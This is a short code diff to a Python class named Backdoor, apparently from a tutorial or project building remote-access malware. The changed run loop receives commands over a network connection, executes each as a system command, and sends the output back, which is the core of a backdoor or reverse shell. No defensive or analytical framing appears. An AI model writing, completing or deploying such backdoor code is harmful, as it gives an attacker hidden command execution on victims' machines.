@@ -20,9 +20,9 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_send()
+            command = self.reliable_receive()
             command_result = self.execute_system_command(command)
-            self.connection.send(command_result)
+            self.reliable_send(command_result)
         connection.close()
 
 
